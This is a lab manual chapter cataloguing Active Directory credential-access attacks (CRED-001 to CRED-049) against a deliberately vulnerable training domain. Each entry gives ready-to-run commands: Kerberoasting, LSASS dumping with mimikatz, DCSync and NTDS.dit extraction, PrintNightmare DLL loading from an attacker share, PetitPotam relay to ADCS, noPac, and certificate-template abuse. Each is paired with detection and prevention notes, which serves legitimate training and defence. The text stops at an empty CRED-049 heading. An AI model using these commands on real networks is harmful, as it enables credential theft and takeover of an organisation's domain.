# 03 — Credential Access (CRED-001..065)

Goal of this phase: turn "domain user `alice`" into "hashes / tickets / certs for higher-privileged principals." Every entry below is wired up in DVAD via the Ansible `vuln-cred-access.yml`, `vuln-kerberos.yml`, `vuln-adcs-esc.yml`, and the ADCS role.

---

### CRED-001 — Kerberoasting
**What it is:** request a TGS for any account with an SPN; the TGS is partly encrypted with the service account's NT hash. Crack offline with hashcat.
**Why it works here:** `svc_web`, `svc_sql`, `svc_legacy` have SPNs and weak passwords (`Summer2023!`, `Password123!`).
**Tools:** `impacket-GetUserSPNs`, `Rubeus`, `hashcat -m 13100`.
**Steps:**
```bash
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
   -request -outputfile spn.hashes
hashcat -m 13100 spn.hashes /usr/share/wordlists/rockyou.txt
```
```powershell
.\Rubeus.exe kerberoast /outfile:spn.hashes /nowrap
```
**Detection:** Event `4769` (TGS request) with `Ticket Encryption Type: 0x17` (RC4-HMAC) — modern services use AES; RC4 requests are roast-shaped. Honeypot SPN account = high-fidelity tripwire.
**Prevention:** AES-only on service accounts (`msDS-SupportedEncryptionTypes=0x18`); gMSAs (auto-rotated 120-day passwords); long random passwords > 25 chars.

---

### CRED-002 — AS-REP Roasting
**What it is:** for accounts with `DONT_REQUIRE_PREAUTH`, the AS-REP is encrypted with the user's NT key without proof of identity — crack offline.
**Why it works here:** `svc_nopreauth`.
**Tools:** `impacket-GetNPUsers`, `Rubeus asreproast`, `hashcat -m 18200`.
**Steps:** see REC-013 for collection. Cracking:
```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```
**Detection:** Event `4768` with pre-auth type 0.
**Prevention:** unset `DONT_REQ_PREAUTH` on every account.

---

### CRED-003 — Password Spray
**What it is:** try one (very) common password against every account. Stays under lockout because each account sees one attempt.
**Why it works here:** 15% of users have `Password123!`; lockout threshold = 0.
**Tools:** `nxc smb`, `kerbrute`.
**Steps:**
```bash
kerbrute passwordspray -d corp.local --dc 10.10.0.10 users.txt 'Password123!'
nxc smb 10.10.0.10 -u users.txt -p 'Password123!' --continue-on-success
```
**Detection:** Event `4625` (failed logon) and `4771` (Kerberos pre-auth failed) across many accounts from one source IP in a short window. Defender for Identity "password spray" alert.
**Prevention:** Smart Account Lockout, MFA, Azure AD password protection, ban common passwords (`Banned Password List`).

---

### CRED-004 — Credential Hunting on a workstation
**What it is:** local admin = read PuTTY/WinSCP profiles, browser saved passwords, DBeaver connections, `cmdkey /list`, `runas /savecred`, Sticky Notes.
**Why it works here:** stock workstation, no LSA hardening.
**Tools:** `LaZagne`, `mimikatz dpapi::`, `SharpChromium`, `WinPwn`.
**Steps:**
```powershell
.\LaZagne.exe all
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials
```
**Detection:** EDR sees `lsasrv.dll` open from non-MS-signed process; AMSI sees LaZagne in PowerShell.
**Prevention:** Credential Guard, browser-managed-by-org (no local passwords), regular cred-hygiene training.

---

### CRED-005 — LSASS Memory Dump (Mimikatz)
**What it is:** read LSASS process memory, extract logon sessions = NT hashes, Kerberos keys, plaintext (older Windows / WDigest).
**Why it works here:** Defender disabled. `WDigest=1` enabled on some hosts (plaintext capture).
**Tools:** `mimikatz`, `lsassy`, `nanodump`, `procdump64`, `comsvcs.dll MiniDump`.
**Steps:**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
```bash
lsassy -u Administrator -p 'DVADlab2024!' 10.10.0.13
# LOLBin variant:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Temp\l.dmp full
```
**Detection:** Sysmon Event `10` (process access) targeting `lsass.exe` from a non-MS-signed process; ProcessAccess masks `0x1010`/`0x1410`. EDR has dedicated rules.
**Prevention:** Credential Guard (LSA isolation), `RunAsPPL=1`, Protected Process Light, ASR rule "Block credential stealing from LSASS."

---

### CRED-006 — SAM Database Extraction
**What it is:** copy/read `C:\Windows\System32\config\SAM` + `SYSTEM` hive → extract local user NT hashes. With `SeBackupPrivilege` you can read locked files.
**Why it works here:** `backup_user` has Backup Operators.
**Tools:** `reg save`, `secretsdump.py`, `pypykatz`.
**Steps:**
```cmd
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
```
```bash
impacket-secretsdump -sam sam -system system LOCAL
```
**Detection:** Event `4663` for SAM/SYSTEM hive access by non-system process.
**Prevention:** Credential Guard for local accounts; LAPS so local admin is unique per host; restrict Backup Operators.

---

### CRED-007 — NTDS.dit via Volume Shadow Copy
**What it is:** snapshot `C:\` on a DC, copy `NTDS.dit` + `SYSTEM`, extract every domain hash offline.
**Why it works here:** Backup Operators have access on `dc01`.
**Tools:** `vssadmin`, `ntdsutil`, `wmiexec.py`, `secretsdump.py`.
**Steps:**
```cmd
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q
```
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
# remote:
impacket-secretsdump -just-dc-ntlm corp.local/Administrator:'DVADlab2024!'@10.10.0.10
```
**Detection:** Event `8222` (VSS), `4661` (NTDS.dit handle), unusual SMB outbound from DC.
**Prevention:** Tier-0 isolation; restrict who is in Backup Operators / Server Operators; Defender for Identity DCSync alert.

---

### CRED-008 — Shadow Credentials (msDS-KeyCredentialLink)
**What it is:** if you have `GenericWrite` on a target user/computer, you can append a public key to `msDS-KeyCredentialLink`. Then PKINIT-auth as that user with your matching private key → get their TGT (and NT hash via UnPAC).
**Why it works here:** `helpdesk` group has GenericWrite on multiple users.
**Tools:** `pyWhisker`, `Certipy shadow`, `Rubeus`.
**Steps:**
```bash
certipy shadow auto -u alice@corp.local -p 'DVADlab2024!' -account svc_web
# certipy prints both the cert and the resulting NT hash
```
**Detection:** Event `5136` (object modified) on `msDS-KeyCredentialLink`. ATA/MDI flag.
**Prevention:** restrict who can write `msDS-KeyCredentialLink` (audit ACLs); enable strict KDC cert validation; consider KeyCredential admin tier.

---

### CRED-009 — Reversible Password Encryption
**What it is:** the `ALLOW_REVERSIBLE_PASSWORD_ENCRYPTION` flag stores the password in a recoverable form. DCSync the user and recover plaintext.
**Why it works here:** `backup_user` has this set.
**Tools:** `secretsdump.py --reversible`, mimikatz `lsadump::dcsync`.
**Steps:**
```bash
impacket-secretsdump -just-dc-user backup_user corp.local/sync_user:'DVADlab2024!'@10.10.0.10
# look for "RevPlaintext" / plaintext field
```
**Detection:** Event `4738` (user account changed) when the flag is set.
**Prevention:** `Set-ADUser -AllowReversiblePasswordEncryption $false` on every account; remove fine-grained password policies that enable it.

---

### CRED-010 — Token Impersonation
**What it is:** when a service runs as user X and you're SYSTEM/admin on the box, you can steal X's token and act as X without their password.
**Why it works here:** services run as service accounts, no privilege separation.
**Tools:** `incognito` (mimikatz), `Invoke-TokenManipulation`, `Rubeus tgtdeleg`.
**Steps:**
```powershell
.\mimikatz.exe "token::elevate" "token::list" "token::use /id:0xN"
Invoke-TokenManipulation -ImpersonateUser -Username 'corp\svc_web'
```
**Detection:** Sysmon `4624` Logon Type 9 from suspicious processes; EDR token-impersonation rules.
**Prevention:** run services with the minimum needed privilege; Protected Users group for sensitive accounts; sensitive accounts marked "Account is sensitive and cannot be delegated."

---

### CRED-011 — Pass-the-Hash (PtH)
**What it is:** authenticate to NTLM-accepting services with the NT hash directly — no plaintext needed.
**Why it works here:** NTLM is enabled everywhere; SMB signing not required.
**Tools:** `nxc smb -H`, `psexec.py -hashes`, `mimikatz sekurlsa::pth`.
**Steps:**
```bash
nxc smb 10.10.0.13 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
impacket-psexec corp.local/Administrator@10.10.0.10 -hashes :31d6...
```
**Detection:** Event `4624` Logon Type 3 + Logon Process `NtLmSsp` from one source to many destinations; Microsoft ATA / MDI "Pass-the-Hash" alert.
**Prevention:** disable NTLM where possible (`Network security: Restrict NTLM`); Protected Users (no NTLM); LAPS; tier-0 isolation.

---

### CRED-012 — Pass-the-Ticket (PtT)
**What it is:** inject an existing Kerberos TGT/TGS into your session and use it for auth.
**Why it works here:** Kerberos default behavior.
**Tools:** `Rubeus ptt`, `mimikatz kerberos::ptt`, `impacket -k`.
**Steps:**
```powershell
.\Rubeus.exe ptt /ticket:base64TGT
# or
.\mimikatz.exe "kerberos::ptt ticket.kirbi"
```
```bash
export KRB5CCNAME=alice.ccache
impacket-psexec -k -no-pass corp.local/alice@dc01.corp.local
```
**Detection:** Event `4624` Logon Type 3 + `Authentication Package: Kerberos` from an account whose normal logon location differs (TGT theft). Hard to detect without baseline.
**Prevention:** Protected Users (TGTs not cached); shorter TGT lifetime; Credential Guard.

---

### CRED-013 — DCSync (Replicate Directory Changes)
**What it is:** `DRSUAPI::GetNCChanges` lets a principal pull password hashes for any user. Requires `Replicating Directory Changes`+ `RDC-All`. Mimikatz/secretsdump speak DRSR.
**Why it works here:** `sync_user` granted both rights; Backup Operators inherits them in some configs.
**Tools:** `secretsdump.py -just-dc`, `mimikatz lsadump::dcsync`.
**Steps:**
```bash
impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc-ntlm
```
```powershell
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator"
```
**Detection:** Event `4662` with object access `DS-Replication-Get-Changes` from a non-DC source IP — Defender for Identity native alert.
**Prevention:** audit who has `Replicating Directory Changes / All / In Filtered Set` — should be DCs only.

---

### CRED-014 — DCSync via `GetChangesAll`
**What it is:** same primitive, higher-tier permission for confidential attributes (e.g. trust passwords, BitLocker keys).
**Why it works here:** `sync_user` has it.
**Tools/Steps:** same as CRED-013, with `-just-dc` (full).
**Detection / Prevention:** same as CRED-013.

---

### CRED-015 — DCShadow
**What it is:** instead of *pulling* secrets, *push* changes by impersonating a DC (Mimikatz registers an SPN, briefly becomes a DC, pushes attribute writes). Lower-fidelity logging because changes look like replication.
**Why it works here:** Schema Admins delegation is loose.
**Tools:** mimikatz `lsadump::dcshadow`.
**Steps:** Mimikatz instance 1 (push): `lsadump::dcshadow /object:CN=alice,... /attribute:primaryGroupID /value:512`. Instance 2 (server): `lsadump::dcshadow /push`.
**Detection:** Event `4742` (computer object created with SPNs `GC/...` `E3514235-4B06-...`), abnormal replication source. MDI native alert.
**Prevention:** remove Schema/Domain Admins write to Configuration container; monitor replication metadata.

---

### CRED-016 — Constrained Delegation Abuse (S4U2Self/S4U2Proxy)
**What it is:** an account with `msDS-AllowedToDelegateTo` set can request a TGS *to that target SPN* on behalf of *any* user (S4U2Proxy). With `TrustedToAuthForDelegation` you can also call S4U2Self first → impersonate anyone to anywhere in the constrained list.
**Why it works here:** `svc_web` has TRUSTED_TO_AUTH_FOR_DELEGATION + delegation to `CIFS/file01`.
**Tools:** `Rubeus s4u`, `impacket-getST`.
**Steps:**
```bash
impacket-getST -spn cifs/file01.corp.local \
   -impersonate Administrator corp.local/svc_web:'Summer2023!' -dc-ip 10.10.0.10
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass file01.corp.local
```
**Detection:** Event `4769` for S4U2Self/S4U2Proxy patterns; abnormal SPN target list.
**Prevention:** **Resource-Based** Constrained Delegation only; never set classic constrained delegation; never set TRUSTED_TO_AUTH_FOR_DELEGATION; Protected Users.

---

### CRED-017 — Resource-Based Constrained Delegation (RBCD)
**What it is:** `msDS-AllowedToActOnBehalfOfOtherIdentity` on a *target* lists principals allowed to delegate to it. If you can write that attribute on a target, you can RBCD-attack from any controllable principal. Combine with MachineAccountQuota=10 to create your own computer.
**Why it works here:** `ws01$` allows `svc_web$` to act on behalf of; `MachineAccountQuota=10`.
**Tools:** `impacket-addcomputer`, `rbcd.py`, `Rubeus s4u`.
**Steps:**
```bash
impacket-addcomputer -computer-name 'evil$' -computer-pass 'P@ssw0rd!' \
   corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
impacket-rbcd -delegate-from 'evil$' -delegate-to 'ws01$' \
   -action write corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
   corp.local/evil\$:'P@ssw0rd!' -dc-ip 10.10.0.10
```
**Detection:** Event `5136` modifying `msDS-AllowedToActOnBehalfOfOtherIdentity`. Defender for Identity native alert.
**Prevention:** `MachineAccountQuota=0`; restrict who can write that attribute; monitor for changes.

---

### CRED-018 — Unconstrained Delegation Abuse
**What it is:** a host with `TRUSTED_FOR_DELEGATION` caches incoming users' TGTs in LSA. Coerce a privileged account (e.g. DC$) to authenticate to such a host, and you can extract their TGT.
**Why it works here:** `file01` has unconstrained delegation; PrinterBug works against DCs.
**Tools:** `Rubeus monitor`, `printerbug.py`, `mimikatz sekurlsa::tickets /export`.
**Steps:**
```powershell
# on file01 (admin):
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
# from any low-priv:
python3 printerbug.py corp.local/alice:'DVADlab2024!'@dc01.corp.local file01.corp.local
# Rubeus catches DC01$ TGT; PtT, DCSync.
```
**Detection:** Event `4624` Logon Type 3 from DC$ to unconstrained host; Defender for Identity unconstrained delegation exposure.
**Prevention:** disable unconstrained delegation entirely (use RBCD); add sensitive accounts to Protected Users / "sensitive and cannot be delegated."

---

### CRED-019 — PrintNightmare (CVE-2021-34527)
**What it is:** RpcAddPrinterDriverEx lets you load arbitrary DLLs as SYSTEM via the Print Spooler. Code exec on every spooler-running host as SYSTEM.
**Why it works here:** unpatched spoolers; Point-and-Print warnings disabled.
**Tools:** `CVE-2021-1675.py`, `PrintNightmare.py`, `SharpPrintNightmare`.
**Steps:**
```bash
python3 cve-2021-1675.py corp.local/alice:'DVADlab2024!'@10.10.0.10 '\\10.10.0.100\share\add_user.dll'
```
**Detection:** Event `316` (PrintService/Admin) with `PrinterDriverInstalled`; Event `808` driver load failures from non-admin contexts.
**Prevention:** disable Print Spooler everywhere it's not used (especially DCs); patch (KB5005010+); set `RestrictDriverInstallationToAdministrators=1`.

---

### CRED-020 — PetitPotam → NTLM Relay to ADCS (ESC8)
**What it is:** `EfsRpcOpenFileRaw` coerces the target into authenticating to a UNC of your choice — works unauthenticated against `MS-EFSRPC`. Relay the NTLM auth to ADCS Web Enrollment (HTTP, no EPA) and request a cert for any user (including DC$).
**Why it works here:** EFSRPC reachable; CA web enrollment HTTP, no Extended Protection.
**Tools:** `PetitPotam.py`, `Coercer`, `ntlmrelayx.py`, `gettgtpkinit.py`.
**Steps:**
```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
   --adcs --template DomainController -smb2support
python3 PetitPotam.py -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.0.10
# Pipe the base64 cert to gettgtpkinit:
python3 gettgtpkinit.py corp.local/DC01\$ -cert-pfx dc01.pfx dc01.ccache
```
**Detection:** Event `4624` from DC$ to attacker IP via NTLM; ADCS Event `4886`/`4887` (cert issued) with mismatch between requester and subject; MDI/ATA "PetitPotam" alert.
**Prevention:** disable NTLM auth on ADCS web enrollment (Kerberos-only) + enable EPA; patch ADV210003; block `EfsRpcOpenFileRaw` (MS-EFSRPC) via RPC filter / KB5005413.

---

### CRED-021 — DFSCoerce (MS-DFSNM)
**What it is:** like PetitPotam but via `NetrDfsAddStdRoot`. Same outcome — coerced NTLM auth.
**Why it works here:** DFS namespace server reachable.
**Tools:** `dfscoerce.py`, `Coercer`.
**Steps:**
```bash
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
python3 dfscoerce.py -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.0.10
```
**Detection:** RPC `MS-DFSNM` calls from non-admin accounts.
**Prevention:** disable DFS Namespaces where not needed; force SMB signing + LDAPS channel binding.

---

### CRED-022 — PrinterBug / SpoolSample
**What it is:** `RpcRemoteFindFirstPrinterChangeNotificationEx` coerces auth. Works from any authenticated user against any spooler.
**Why it works here:** Print Spooler on by default.
**Tools:** `printerbug.py`, `SpoolSample.exe`, `Coercer`.
**Steps:** see CRED-018 example.
**Detection:** Event `4768` from DC$ to unusual destinations; Print Service Admin Event `808`.
**Prevention:** disable Print Spooler on DCs (KB5005413 — no impact); StopAndDisableHyperVRelayedRPC.

---

### CRED-023 — sAMAccountName Spoofing (noPac)
**What it is:** CVE-2021-42278/42287. Create a machine account, rename it to a DC's name (without the `$`), request a TGT, then rename back — the KDC issues PAC for the DC. S4U2Self → DA.
**Why it works here:** `MachineAccountQuota=10`, unpatched (kernel-mode patch missing in lab).
**Tools:** `noPac.py`, `Rubeus + Pachine`, `impacket-getTGT`.
**Steps:**
```bash
python3 noPac.py -dc-ip 10.10.0.10 corp.local/alice:'DVADlab2024!' \
   -dc-host dc01.corp.local -shell
```
**Detection:** Event `4741` (computer created) + `4742` (renamed) + `4624` Logon Type 3 with mismatched names; MDI alert.
**Prevention:** patch (KB5008380+); `MachineAccountQuota=0`.

---

### CRED-024 — Certifried (CVE-2022-26923 / ESC22)
**What it is:** abuse `dNSHostName` write on a machine account — set the DC's dNSHostName on your computer, enroll the Machine template, get a cert valid as DC$ → DCSync.
**Why it works here:** unpatched + Machine template enrollable by Domain Computers.
**Tools:** `Certipy`, `Certify`.
**Steps:**
```bash
impacket-addcomputer -computer-name 'attack$' -computer-pass 'P@ssw0rd!' \
   corp.local/alice:'DVADlab2024!'
certipy account update -u alice@corp.local -p 'DVADlab2024!' \
   -user attack$ -dns dc01.corp.local
certipy req -u 'attack$@corp.local' -p 'P@ssw0rd!' -ca corp-CA-CA -template Machine \
   -target ca01.corp.local
certipy auth -pfx attack.pfx -dc-ip 10.10.0.10
# DC$ TGT -> DCSync
```
**Detection:** Event `5136` modifying `dNSHostName`; ADCS event for cert issuance with mismatched SAN.
**Prevention:** patch (KB5014754); strong cert mapping (StrongCertificateBindingEnforcement=2); remove non-admin write on `dNSHostName`.

---

### CRED-025 — WebClient Service Abuse
**What it is:** if WebClient is running on a target, it'll honor a `\\host@SSL@port\file` UNC and do NTLM auth over HTTP (WebDAV) — relayable everywhere.
**Why it works here:** WebClient enabled in lab.
**Tools:** `PetitPotam`, `Coercer --transport http`.
**Steps:**
```bash
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access --no-smb-server -smb2support -http-port 80
python3 PetitPotam.py -u alice -p 'DVADlab2024!' \
   '\\attacker@80/foo' file01.corp.local
```
**Detection:** WebDAV PROPFIND in IIS logs; WebClient service start events.
**Prevention:** disable WebClient on servers; force SMB; LDAP channel binding.

---

### CRED-026 — ADIDNS Wildcard Poisoning
**What it is:** any Authenticated User can create records in AD-integrated DNS. Insert a wildcard `*` record → catch fallthrough lookups (printers, wpad, file servers).
**Why it works here:** default ADIDNS permissions.
**Tools:** `Invoke-DNSUpdate`, `dnstool.py`, `krbrelayx/dnstool.py`.
**Steps:**
```bash
python3 dnstool.py -u 'corp\alice' -p 'DVADlab2024!' \
   -r '*' -d 10.10.0.100 --action add 10.10.0.10
```
**Detection:** Event `5136` on `dnsNode` objects under `MicrosoftDNS`.
**Prevention:** restrict `Create child` on `DnsZone` to admins only; use DNSSEC; isolate ADIDNS modifications via ACL.

---

### CRED-027 — ADCS Disable SAN Validation (ESC6 variant)
**What it is:** the CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` lets requesters add SAN to *any* enrollment. Combined with a Client Auth template = request cert with `Administrator@corp.local` as SAN → DA cert.
**Why it works here:** CA registry flag set.
**Tools:** `Certipy req --upn`, `Certify request /altname:`.
**Steps:**
```bash
certipy req -u alice@corp.local -p 'DVADlab2024!' -ca corp-CA-CA \
   -template User -upn Administrator@corp.local -target ca01.corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```
**Detection:** ADCS Event `4886`/`4887` where requester ≠ SAN; MDI ESC6 alert.
**Prevention:** clear EDITF flag: `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`; require manager approval on sensitive templates.

---

### CRED-028 — ESC15 / CVE-2024-49019 (EKUwu)
**What it is:** schema-v1 templates can have arbitrary Application Policies in the CSR — request a cert with both Client Auth and a SAN spec that the schema-v1 template allows but doesn't enforce.
**Why it works here:** legacy v1 templates published.
**Tools:** `Certipy ≥ 4.8`.
**Steps:**
```bash
certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA \
   -template WebServer -application-policies 'Client Authentication' \
   -upn Administrator@corp.local
```
**Detection:** ADCS event with non-standard Application Policy OIDs.
**Prevention:** patch (KB5044284); migrate v1 templates to v2+; remove Client Auth from broad templates.

---

### CRED-029 — NTLMSSP Hash Downgrade
**What it is:** force NetNTLMv1 by setting `LMCompatibilityLevel <= 2` and capturing — NTLMv1 is trivially crackable to NT hash via `crack.sh`.
**Why it works here:** legacy compat level on some hosts.
**Tools:** `Responder --lm`, `crack.sh`.
**Steps:** Responder with `--lm`; submit captured `:::1122334455667788:::` blob.
**Detection:** Event `4624`/`4625` `Authentication Package: NTLM V1`.
**Prevention:** `LMCompatibilityLevel=5` (NTLMv2 only) via GPO.

---

### CRED-030 — GPP Password Extraction (MS14-025)
**What it is:** legacy Group Policy Preferences stored an AES-encrypted `cpassword` in `Groups.xml`/`Drives.xml`. The AES key is public (Microsoft published it). Decrypt → cleartext local admin / service account.
**Why it works here:** we left old GPP file in SYSVOL.
**Tools:** `Get-GPPPassword`, `gpp-decrypt`.
**Steps:** see REC-015.
**Detection:** SYSVOL grep alerts.
**Prevention:** delete every GPP `cpassword` file; KB2962486.

---

### CRED-031 — AS-ROAST variant
**What it is:** same as CRED-002 — flagged separately in PLAN.md for `no_preauth_svc`. Same tools.

---

### CRED-032 — LDAP Simple Bind Interception
**What it is:** LDAP simple binds on port 389 send credentials in cleartext. Sniff = creds.
**Why it works here:** LDAP signing not required.
**Tools:** `tcpdump`, `bettercap`, `Wireshark`.
**Steps:**
```bash
sudo tcpdump -i virbr1 -A 'port 389 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x60'
```
**Detection:** Event `2887`/`2889` (LDAP signing/binding diagnostics).
**Prevention:** "LDAP server signing requirements = Require Signing"; force LDAPS; disable simple bind.

---

### CRED-033 — LAPS Password Read
**What it is:** `ms-Mcs-AdmPwd` (legacy LAPS) or `msLAPS-Password` (Windows LAPS) stores the local Administrator password. Read access → local admin everywhere.
**Why it works here:** `IT_Team` delegated read on legacy LAPS attribute.
**Tools:** `nxc ldap --laps`, `LAPSDumper`, `Get-LAPSADPassword`.
**Steps:**
```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --laps
python3 laps.py -u alice -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
```
**Detection:** Event `4662` reading `ms-Mcs-AdmPwd` attribute (GUID known).
**Prevention:** audit who has `All Extended Rights` / `Read ms-Mcs-AdmPwd` on OUs; migrate to Windows LAPS with encryption.

---

### CRED-034 — gMSA Password Read
**What it is:** `msDS-ManagedPassword` returns the current+previous gMSA NT keys to anyone in `PrincipalsAllowedToRetrieveManagedPassword`.
**Why it works here:** `helpdesk` is in the list for `gmsa_svc$`.
**Tools:** `gMSADumper`, `nxc ldap --gmsa`.
**Steps:**
```bash
python3 gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local
```
**Detection:** Event `4662` reading `msDS-ManagedPassword` from non-host account.
**Prevention:** lock down `PrincipalsAllowedToRetrieveManagedPassword` to the intended host only.

---

### CRED-035 — Credential Manager Saved Creds
**What it is:** Windows Credential Manager (`cmdkey`) holds saved RDP/SMB creds per user. Local-admin you can read another user's via DPAPI.
**Why it works here:** standard Windows behavior.
**Tools:** `cmdkey`, `mimikatz dpapi::cred`, `SharpDPAPI`.
**Steps:**
```powershell
cmdkey /list
SharpDPAPI.exe credentials /unprotect
```
**Detection:** DPAPI key access from non-user context.
**Prevention:** Credential Guard; train users not to save admin creds.

---

### CRED-036 — Browser Credential Extraction
**What it is:** Chrome/Edge/Firefox saved passwords; encrypted with user's DPAPI master key.
**Tools:** `SharpChromium`, `mimikatz dpapi::chrome`.
**Steps:**
```powershell
SharpChromium.exe all
```
**Detection:** access to `Login Data` SQLite file by non-browser.
**Prevention:** managed browser policy; disable saved passwords for managed identities.

---

### CRED-037 — AzureAD SSO Token Extraction
**What it is:** Hybrid SSO uses `AZUREADSSOACC$` computer object's NT hash to sign tickets. With the hash you forge tickets as any synced user.
**Why it works here:** placeholder if hybrid PTA/PHS is wired up. (Not enabled in default DVAD topology.)
**Tools:** `AADInternals`.
**Steps:**
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
Open-AADIntOffice365Portal -AccessToken $token
```
**Detection:** Entra ID sign-in logs anomalous device location.
**Prevention:** rotate `AZUREADSSOACC$` regularly; Conditional Access; FIDO2.

---

### CRED-038 — SSP Injection
**What it is:** load `mimilib.dll` as an LSA Security Support Provider — every logon's plaintext gets logged to disk.
**Why it works here:** admin on DC + Defender off.
**Tools:** mimikatz `misc::memssp`, `mimilib.dll`.
**Steps:**
```powershell
.\mimikatz.exe "privilege::debug" "misc::memssp"
# every subsequent logon -> %SystemRoot%\System32\mimilsa.log
```
**Detection:** registry write to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`.
**Prevention:** Credential Guard / RunAsPPL on LSASS; restrict who can edit LSA registry keys.

---

### CRED-039 — SeBackupPrivilege → SAM/SECURITY/NTDS
**What it is:** `SeBackupPrivilege` bypasses file ACLs for read. Member of Backup Operators on a DC → read `NTDS.dit` and the registry SYSTEM hive → secretsdump offline.
**Why it works here:** `backup_user` has it.
**Tools:** `robocopy /B`, `reg save`, `diskshadow`.
**Steps:**
```cmd
diskshadow /s c:\temp\shadow.txt
robocopy /B \\dc01\C$\Windows\NTDS\ C:\Temp\ntds NTDS.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```
**Detection:** Event `4673` `SeBackupPrivilege` used by non-backup software.
**Prevention:** restrict Backup Operators membership; tiered admin model.

---

### CRED-040 — SeTrustedCredManAccessPrivilege → DPAPI
**What it is:** very rare privilege that lets you access Credential Manager for any user.
**Tools:** custom PoCs.
**Detection:** Event `4673` on the privilege.
**Prevention:** never assign this privilege.

---

### CRED-041 — SeDebugPrivilege → LSASS
**What it is:** open `lsass.exe` for `PROCESS_VM_READ` → MiniDump → secretsdump.
**Why it works here:** Administrators have SeDebugPrivilege by default.
**Tools/Steps:** see CRED-005.
**Detection:** Sysmon `10` lsass-access from non-MS-signed process.
**Prevention:** Credential Guard / RunAsPPL.

---

### CRED-042 — SeImpersonatePrivilege → Potato
**What it is:** the Potato family abuses `SeImpersonate` granted to service accounts (IIS AppPool, SQL service) to coerce SYSTEM auth → impersonate token → SYSTEM. See PE-001 / PE-052.

---

### CRED-043 — RID Hijacking
**What it is:** with SYSTEM on a workstation, overwrite SAM `F` value for an attacker account so its RID becomes 500 → permanent local administrator regardless of password resets.
**Tools:** [`SecPwn/rid-hijack`](https://github.com/r4wd3r/RID-Hijacking), `mimikatz misc::regedit`.
**Steps:** offline SAM edit.
**Detection:** Event `4660`/`4663` on `SAM` hive.
**Prevention:** monitor SAM modifications; Credential Guard for local; LAPS.

---

### CRED-044 — Hash Dump via VSS
**What it is:** `vssadmin create shadow` → mount → copy NTDS.dit/SYSTEM/SAM → secretsdump. See CRED-007.

---

### CRED-045 — DPAPI Master Key Theft
**What it is:** every user's DPAPI master key is stored in `%APPDATA%\Microsoft\Protect\<sid>\`. As SYSTEM you can read it; with the master key + ciphertext you decrypt any user's protected secret.
**Tools:** `mimikatz dpapi::masterkey`, `SharpDPAPI`.
**Steps:**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi"   # gets cached MK from LSASS
.\SharpDPAPI.exe masterkeys
```
**Detection:** access to `Microsoft\Protect\` files cross-user.
**Prevention:** Credential Guard; encrypt the host disk; tier-0 isolation.

---

### CRED-046 — NTLMv2 Reflection via Responder
**What it is:** combination of LLMNR/NBT-NS poisoning + relaying back to the originating host (when SMB signing not required) → command exec.
**Tools:** `Responder` + `ntlmrelayx.py`.
**Steps:**
```bash
# Responder.conf: disable SMB + HTTP servers (let ntlmrelayx handle)
sudo responder -I virbr1 -A
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc ..."
```
**Detection:** Defender for Identity "NTLM relay" alert; SMB1/2 packet captures.
**Prevention:** SMB signing required on every host; disable LLMNR/NBT-NS; LDAP signing + channel binding.

---

### CRED-047 — Certificate Private Key Export (ESC12 / enrollment agent)
**What it is:** enrollment-agent template + over-permissive ACL → request "Enrollment Agent" cert → use it to enroll on behalf of any user.
**Tools:** `Certipy req -on-behalf-of`.
**Steps:**
```bash
certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA -template EnrollmentAgentTemplate
certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA -template User \
   -on-behalf-of 'corp\Administrator' -pfx ea.pfx
```
**Detection:** ADCS Event `4886`/`4887` with "Enrollment Agent" attribute.
**Prevention:** restrict EA templates to designated PKI staff; enable Enrollment Agent Restrictions on the CA.

---

### CRED-048 — NTLM Relay to LDAPS without Channel Binding
**What it is:** if LDAPS doesn't enforce EPA (channel binding token), NTLM auth captured over SMB can be relayed to LDAPS and used to write any AD object (e.g. set RBCD).
**Why it works here:** channel binding off.
**Tools:** `ntlmrelayx.py --delegate-access -t ldaps://...`.
**Steps:**
```bash
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
# trigger coercion or relay an arriving auth
```
**Detection:** LDAPS connections with no EPA (Event `2889`).
**Prevention:** require LDAP signing **and** channel binding; KB4520412 / `LdapEnforceChannelBinding=2`.

---

### CRED-049 — WebDAV Client Coercion → LDAP Relay
